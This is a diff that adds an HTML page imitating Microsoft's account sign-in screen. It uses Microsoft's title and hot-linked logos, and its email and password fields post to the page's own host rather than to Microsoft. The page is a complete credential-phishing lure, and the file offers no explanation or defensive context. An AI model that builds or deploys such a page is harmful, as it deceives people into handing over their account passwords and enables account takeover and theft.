@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content="width=device-width" />
+		<title>Sign in to your Microsoft account</title>
+		<link rel='icon' href='https://auth.gfx.ms/16.000.27621.00/images/favicon.ico'/>
+	</head>
+
+	<body>
+		<style>
+
+			html,
+			body
+			{
+				margin: 0 !important;
+				background-color: #107c10;
+				position: relative;
+				height: 100vh;	
+			}
+
+			.middle-area
+			{
+				margin: -5% auto 0 auto;
+				display: block;
+				position: relative;
+				top: 50%;
+				transform: translateY(-50%);
+			}
+
+			.login-area
+			{
+				margin: 0 auto;
+				min-width: 320px;
+    			max-width: 412px;
+				min-height: 364px;
+			}
+
+			.login-banner
+			{
+				text-align: center;
+			}
+
+			.login-modal
+			{
+				margin: 24px auto;
+				min-width: 90%;
+    			max-width: 412px;
+    			padding: 36px;
+				min-height: 328px;
+				background: #FFF;
+			}
+
+			.sign-in-heading
+			{
+				margin: 16px 0;
+				font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+				font-size: 24px;
+				font-weight: 100 !important;
+			}
+
+			.input-area input
+			{
+			    border-width: 1px;
+			    border-color: #666;
+			    box-sizing: border-box;
+			    padding-left: 10px;
+			    border-color: rgba(0,0,0,.6);
+			    height: 36px;
+			    outline: none;
+			    width: 100%;
+			    margin: 8px 0;
+			    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+			    font-size: 15px;
+			}
+
+			.create
+			{
+				font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+				font-size: 13px;
+			}
+
+			.create a
+			{
+			    text-decoration: none;
+			}
+
+			.create a:link,
+			.create a:visited
+			{
+			    color: #0067b8;
+			}
+
+			#input-sign input
+			{
+				width: 100%;
+				background: #0067b8;
+				color: #FFF;
+			}
+
+			#input-sign input:hover
+			{
+				cursor: pointer;
+				background: #0067a0;
+				color: #FFF;
+			}
+
+			@media only screen and (max-width: 768px)
+			{
+				.login-area
+			    {
+			   		max-width: 90%;
+			    }
+
+			    .login-modal
+			    {
+			    	padding: 16px;
+			    }
+			}
+
+		</style>
+
+		<div class='middle-area'>
+			<form method='post'>
+				<div class='login-area'>
+					<div class='login-banner'>
+						<img src='https://auth.gfx.ms/16.000.27621.00/images/AppLogos/20.png?x=71c5dd371596273fd346bd0c6ebe8fb9'/>
+					</div>
+					<div class='login-modal'>
+						<img src='https://auth.gfx.ms/16.000.27621.00/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd'/>
+						<div class='sign-in-heading'>
+							Sign in
+						</div>
+						<div class='input-area'>
+							<div id='input-email'>
+								<input name='email' placeholder="Email, phone or Skype">
+							</div>
+							<div id='input-pass'>
+								<input name='pass' type='password' placeholder="Password">
+							</div>
+							<div id='input-sign'>
+								<input type='submit' value='Sign in' />
+							</div>
+						</div>
+						<div class='create'>
+							No account? 
+							<a href='https://signup.live.com/signup'>Create one!</a>
+						</div>
+					</div>
+				</div>
+			</form>
+		</div>
+	</body>
+</html>
